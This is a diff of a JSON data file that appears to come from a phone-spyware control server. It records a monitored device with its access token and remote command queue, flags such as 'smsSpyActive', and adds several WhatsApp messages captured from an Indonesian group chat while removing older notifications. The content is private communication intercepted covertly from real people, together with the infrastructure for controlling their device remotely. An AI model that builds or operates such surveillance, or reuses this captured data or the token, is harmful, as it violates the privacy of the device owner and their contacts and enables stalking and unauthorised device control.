@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003792846,
+    "lastSeen": 1776003795536,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (35 pesan): ~ ~`lova",
+        "content": "orang orang ini semua norak ih",
+        "time": "12/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003795537
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎35 pesan baru",
+        "time": "12/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003795527
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (35 pesan): ~ zaa?",
+        "content": "rabun kau",
+        "time": "12/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003795511
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
@@ -4099,30 +4123,6 @@
         "time": "12/04 11:20",
         "pkg": "com.whatsapp",
         "receivedAt": 1775967606482
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎2 pesan baru",
-        "time": "12/04 11:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775967564814
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎1 pesan baru",
-        "time": "12/04 11:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775967556851
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎1 pesan baru",
-        "time": "12/04 11:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775967420421
       }
     ],
     "galleryPhotos": [],
